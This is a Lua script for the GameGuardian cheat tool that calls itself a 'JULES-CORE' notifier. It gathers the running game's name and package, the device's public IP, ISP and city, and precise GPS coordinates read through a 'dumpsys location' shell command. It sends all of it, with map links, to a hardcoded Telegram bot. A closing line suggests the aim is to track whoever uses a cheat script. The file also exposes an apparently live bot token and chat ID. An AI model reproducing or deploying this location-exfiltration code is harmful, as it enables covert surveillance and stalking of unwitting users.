-- [[ CONFIGURATION - EDIT YOUR TELEGRAM CREDENTIALS HERE ]]
local BOT_TOKEN = "8535493018:AAEgeb5NDTUPW-4Qh5hdouAJ09Q2PCEvejw"
local CHAT_ID = "6149504951"

-- [[ JULES-CORE CLEAN NOTIFIER ]]
-- Fitur: IP Tracking, Geolocation, Game Detection, Time/Date (No ASCII Box)

local function get_session_info()
    local gameName = "Unknown Game"
    local package = "Unknown Package"

    local status, info = pcall(gg.getTargetInfo)
    if status and info then
        gameName = info.label or gameName
        package = info.packageName or package
    end

    return {
        game = gameName,
        package = package
    }
end

local function get_gps_location()
    gg.toast("🛰️ Memperoleh koordinat GPS (Akurat)...")

    local output = nil
    -- Attempt using gg.shell (preferred in newer GG versions)
    if gg.shell then
        local res = gg.shell("dumpsys location", true)
        if res and res.output then output = res.output end
    end

    -- Fallback to io.popen if gg.shell is missing or failed
    if not output then
        local status, f = pcall(io.popen, "dumpsys location", "r")
        if status and f then
            output = f:read("*a")
            f:close()
        end
    end

    if not output then return nil end

    -- Parsing pattern for: last location=Location[gps 37.421998,-122.084000 ...
    local lat, lon = output:match("last location=Location%[%w+ ([%-%.%d]+),([%-%.%d]+)")

    if lat and lon then
        return {
            lat = lat,
            lon = lon,
            type = "GPS (High Accuracy)"
        }
    end
    return nil
end

local function get_location()
    gg.toast("🛰️ Memperoleh koordinat IP...")

    -- Primary Provider: ip-api.com
    local function fetch_ip_api()
        local url = "http://ip-api.com/line/?fields=status,country,regionName,city,lat,lon,isp,query"
        local response = gg.makeRequest(url)
        if not response or response.code ~= 200 then return nil end

        local lines = {}
        for line in response.content:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end
        if lines[1] ~= "success" then return nil end
        return {
            country = lines[2],
            region  = lines[3],
            city    = lines[4],
            lat     = lines[5],
            lon     = lines[6],
            isp     = lines[7],
            ip      = lines[8],
            type    = "IP (Estimate)"
        }
    end

    -- Fallback Provider: ipapi.co
    local function fetch_ipapi_co()
        local url = "https://ipapi.co/csv/"
        local response = gg.makeRequest(url)
        if not response or response.code ~= 200 then return nil end

        local parts = {}
        for part in (response.content .. ","):gmatch("([^,]*),") do
            table.insert(parts, part:gsub('^"(.*)"$', '%1')) -- Remove quotes if any
        end

        if #parts < 11 then return nil end
        return {
            ip      = parts[1],
            city    = parts[2],
            region  = parts[3],
            country = parts[6],
            lat     = parts[10],
            lon     = parts[11],
            isp     = parts[18] or "Unknown",
            type    = "IP (Fallback)"
        }
    end

    local loc = fetch_ip_api()
    if not loc then
        gg.toast("🔄 Menggunakan fallback API...")
        loc = fetch_ipapi_co()
    end
    return loc
end

local function send_report()
    local date = os.date("%Y-%m-%d")
    local time = os.date("%H:%M:%S")

    local session = get_session_info()
    local ip_loc = get_location()
    local gps_loc = get_gps_location()

    -- Design modern minimalis
    local line = "━━━━━━━━━━━━━━━━━━━━"

    local message = "🚀 <b>[ JULES-CORE SYSTEM REPORT ]</b>\n" ..
                    line .. "\n" ..
                    "<b>📅 TANGGAL :</b> <code>" .. date .. "</code>\n" ..
                    "<b>⏰ WAKTU   :</b> <code>" .. time .. "</code>\n" ..
                    "<b>📊 STATUS  :</b> <code>ACTIVE</code>\n" ..
                    line .. "\n" ..
                    "<b>🎮 GAME    :</b> <code>" .. session.game .. "</code>\n" ..
                    "<b>📦 PACKAGE :</b> <code>" .. session.package .. "</code>\n" ..
                    line .. "\n"

    -- Section 1: IP Based Location
    if ip_loc then
        message = message .. "<b>🌐 IP ADDR  :</b> <code>" .. ip_loc.ip .. "</code>\n" ..
                    "<b>🏢 ISP      :</b> <code>" .. ip_loc.isp .. "</code>\n" ..
                    "<b>🏙️ KOTA     :</b> <code>" .. ip_loc.city .. "</code>\n" ..
                    "<b>🇮🇩 NEGARA   :</b> <code>" .. ip_loc.country .. "</code>\n" ..
                    "📍 <a href=\"https://www.google.com/maps?q=" .. ip_loc.lat .. "," .. ip_loc.lon .. "\"><b>Lihat Estimasi IP</b></a>\n" ..
                    line .. "\n"
    else
        message = message .. "<b>🌐 IP ADDR  :</b> <code>Gagal Memperoleh</code>\n" .. line .. "\n"
    end

    -- Section 2: GPS Based Location (100% Correct)
    if gps_loc then
        message = message .. "<b>🎯 GPS LOC   :</b> <code>" .. gps_loc.lat .. ", " .. gps_loc.lon .. "</code>\n" ..
                    "<b>✅ STATUS    :</b> <code>100% AKURAT</code>\n" ..
                    "📍 <a href=\"https://www.google.com/maps?q=" .. gps_loc.lat .. "," .. gps_loc.lon .. "\"><b>BUKA LOKASI SEKARANG</b></a>\n" ..
                    line .. "\n"
    else
        message = message .. "<b>🎯 GPS LOC   :</b> <code>Tidak Tersedia (No Root/GPS Off)</code>\n" .. line .. "\n"
    end

    message = message .. "<i>notifikasi script digunakan oleh user ini</i>"

    local tgUrl = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
    local headers = { ["Content-Type"] = "application/json" }

    -- Escaping karakter untuk JSON payload
    local escaped_message = message:gsub('"', '\\"'):gsub('\n', '\\n')
    local body = '{"chat_id": "' .. CHAT_ID .. '", "text": "' .. escaped_message .. '", "parse_mode": "HTML", "disable_web_page_preview": true}'

    gg.toast("📡 Mengunggah laporan gabungan...")
    local res = gg.makeRequest(tgUrl, headers, body)

    if res and res.code == 200 then
        gg.alert("✅ Laporan Berhasil Dikirim.\n\n" .. (gps_loc and "📍 GPS Akurat Berhasil Didapat!" or "⚠️ GPS Tidak Didapat (Hanya IP)"))
    else
        local err = "❌ Gagal mengirim laporan."
        if res then err = err .. " (Code: " .. res.code .. ")" end
        gg.alert(err .. "\nPeriksa Token & Chat ID.")
    end
end

send_report()
